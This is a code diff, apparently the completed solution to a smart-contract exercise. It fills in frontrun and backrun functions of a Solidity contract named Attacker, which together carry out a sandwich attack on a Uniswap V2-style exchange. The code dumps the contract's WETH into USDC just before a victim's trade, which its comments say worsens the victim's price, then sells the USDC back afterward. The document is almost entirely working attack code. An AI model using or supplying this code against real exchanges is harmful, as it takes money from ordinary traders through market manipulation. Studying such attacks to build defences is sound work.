@@ -14,14 +14,28 @@ import "./interfaces/IERC20.sol";
  *
  */
 contract Attacker {
-    // This function will be called before the victim's transaction.
+    // Dump WETH -> USDC right before the victim, worsening their execution price.
     function frontrun(address router, address weth, address usdc, uint256 deadline) public {
-        // your code here
+        uint256 amountIn = IERC20(weth).balanceOf(address(this));
+        IERC20(weth).approve(router, amountIn);
+
+        address[] memory path = new address[](2);
+        path[0] = weth;
+        path[1] = usdc;
+
+        IUniswapV2Router(router).swapExactTokensForTokens(amountIn, 0, path, address(this), deadline);
     }
 
-    // This function will be called after the victim's transaction.
+    // Sell all USDC back for WETH after the victim has pushed the price further.
     function backrun(address router, address weth, address usdc, uint256 deadline) public {
-        // your code here
+        uint256 amountIn = IERC20(usdc).balanceOf(address(this));
+        IERC20(usdc).approve(router, amountIn);
+
+        address[] memory path = new address[](2);
+        path[0] = usdc;
+        path[1] = weth;
+
+        IUniswapV2Router(router).swapExactTokensForTokens(amountIn, 0, path, address(this), deadline);
     }
 }
 
